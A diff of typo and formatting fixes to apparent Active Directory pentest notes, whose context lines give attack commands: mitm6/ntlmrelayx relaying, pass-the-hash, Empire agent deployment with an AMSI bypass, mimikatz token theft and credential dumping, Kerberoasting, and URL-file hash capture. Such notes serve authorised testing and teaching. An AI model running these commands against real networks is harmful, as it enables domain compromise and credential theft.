@@ -228,10 +228,9 @@ NOTE: We can also use hashes instead of password
     psexec.py domain/username:password@IPADDRESS
 
 IPV6 DNS TAKEOVER
-
 Most of the AD networks dont have dns server setup for ipv6 and we can act as a ipv6 dns server (mitm) and can dump important information like users,groups,policies,computers ,user descriptions(might contain password etc) meaning this attack is highly critical and expose the domain sensitive information
 
-By default every device in the network check up with ipv6 dns every 30 mins or after every restart.so we may need to wait 30 mins in real scenairo or can simulate a restart in lab env
+By default every device in the network check up with ipv6 dns every 30 mins or after every restart. So we may need to wait 30 mins in real scenairo or can simulate a restart in lab env
 
     First run mitm6
 
@@ -242,13 +241,13 @@ By default every device in the network check up with ipv6 dns every 30 mins or a
     ntlmrelayx.py -6 -t ldaps://DCIP -wh fakewpad.domain.name -l lootdir
 
 When a domain admin logs in and we are active for this attack,ntlmrelayx automatically adds a new user and assign specific high level priveleges to that user,providing us solid persistence.
+
 Passback Attacks
-
 In this attack we target iot devices,or other devices in an organization like printers,smtp,etc. If we find a edit panel for printer setup , smtp setup etc,we can try using default credentials etc. Or if this device is connected to the LDAP service of the network it will be pointing itself to ldap server and port which is mostly on DC.so we can point the device towards our ip instead of ldap server and a port and then either listen on nc or use responder.
-
 shttps://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/
-Enumerating AD users without wordlists using crackmapexec (RID bruteforce)
 
+
+Enumerating AD users without wordlists using crackmapexec (RID bruteforce)
     crackmapexec smb $ip -u anonymous -p '' -d domain.name --rid-brute (anonymous login)
 
 we can also provide proper credentials for accurate info
@@ -257,7 +256,7 @@ Enumerating AD users for kerberos attack (requires dc ip and wordlist)
 using tool called kerbrute
 
 To enumerate avalible users for kerberos authentication use command
-here dc is for domain controller and d is for domain. d is neccassary to specify
+here dc is for domain controller and d is for domain. d is necessary to specify
     ./kerbrute userenum --dc IPdomaincontroller -d CONTROLLER.local WordLists/ADusers.txt
 
 If we have credentials of the machine then we can enumerate users more accurately with impacket
@@ -273,8 +272,8 @@ Once we have gained access in a machine from the network
     Gather info using powerview
     Map the AD environment by using bloodhound
 
-PowerView.ps1
 
+PowerView.ps1
 cheatsheet link : https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
 
 First bypass powershell execution policy and then import powerview
@@ -399,13 +398,12 @@ I changed on my machine neo4j : hello
 
     Now simply click analysis and click any type of query and we can see graph of AD
 
-    We can view varius types of permissions etc
+    We can view various types of permissions etc
 
 Post Compromise attacks (either have a shell or have credentials in the network)
 Once we are in a network computer or have set of credentials from previous attacks we can proceed with post compromise
 
-Pass the hash/password
-
+PtH
 In this attack we simply pass the credentials in entire network range to see in how many devices we can logon(Password reuse). We can either use the hashes (last portion of ntlm hash) or plaintext password and pass em around using crackmapexec
 
     NOTE:NTLM hashes can be passed but NTLMv2 hashes cannot be passed
@@ -453,9 +451,8 @@ We can also use empire framework module to get a agent back for a c2 channel. We
     crackmapexec smb 192.168.125.133 -u fcastle -p 'Password1' -d HYDRA.local -M empire_exec -o LISTENER=final --amsi-bypass bypassfile
 
     Mitigations
-
     Avoid reusing local admin passwords across the network
-    only set privelges to user as they require (principle of least privilege)
+    only set privileges to user as they require (principle of least privilege)
     Set strong complex password policy
     use PAM and autorotate passwords on daily basis
 
@@ -524,7 +521,6 @@ OR
     lsadump::lsa /patch (for Windows AD server)
 
 Gain access in other machines
-
 We can use smbexec,wmiexec,psexec using the gained credentials for a semi interactive shell.Then we can find a way to gain a interactive shell or pipe a C2 Framework like empire for persistence or post exploitation.psexec is noisy and should be as a last resort
 
 NOTE: We can also use hashes instead of password
@@ -537,7 +533,6 @@ NOTE: We can also use hashes instead of password
     psexec.py domain/username@IPADDRESS
 
 Token Impersonation
-
 https://adsecurity.org/?page_id=1821#TOKENElevate https://steflan-security.com/linux-privilege-escalation-token-impersonation/
 
 Whenever a user logs in a machone,windows create a token called delegate token and injects into session.If we have got any access of the machine,we can steal the token and impersonate as that user.If a domain admin logs in the machine,then his token is also available and we can simply impersonate as domain admin using that token.We can then dump ntds.dit and own the domain.
@@ -547,20 +542,17 @@ Advice : move from machine to machine and try to find domainadmins token for a e
 NOTE:Local admin required
 
 Note : If we are administrator or similiar privileges but we are getting error on running mimikatz , list down the process and migrate to a process running as administrator . Same goes for if we are system but our process might be in administrator contex
+
+
 Using Mimikatz
-
 run mimikatz
-
     run this command
-
     token::elevate (impersonate local admin)
 
 or
-
     token::elevate /domainadmin (impersonate domain admin)
 
-    NOw run
-
+    Now run
     token::run /process:cmd.exe
 
     Optional commands
@@ -595,8 +587,7 @@ Mitigations:
 
     Local Admin passwords must be complex and not same across the network
 
-Kerbroasting
-
+Kerberoasting
 Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain.
 
 If we are on the target and need to find all the spn accounts
@@ -636,7 +627,6 @@ What Can a Service Account do?
 After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.
 
 Mitigations:
-
     Strong Complex passwords
     Dont make service accounts domain admins
 
@@ -715,7 +705,7 @@ Url File Attacks
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share
 
-In this attack we create a url file ,pointing towards our ip address and then upload this file to a writable share with a appropriate name starting with @ or - so that the file is on top when any user access that share.We run responder on our machine and then wait for any user to open the file and we can grab the hash just like we did before. This requires access to any domain machine
+In this attack we create a url file ,pointing towards our ip address and then upload this file to a writable share with a appropriate name starting with @ or - so that the file is on top when any user access that share. We run responder on our machine and then wait for any user to open the file and we can grab the hash just like we did before. This requires access to any domain machine
 
     create a file with following text and name it like "@anyname.url"
 
@@ -751,6 +741,7 @@ ElevatedInstaller exploit (cve-2021-41379)
 PrintSpooler
 
 ##Zero logon
+
 Golden and silver tickets
 
 A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.
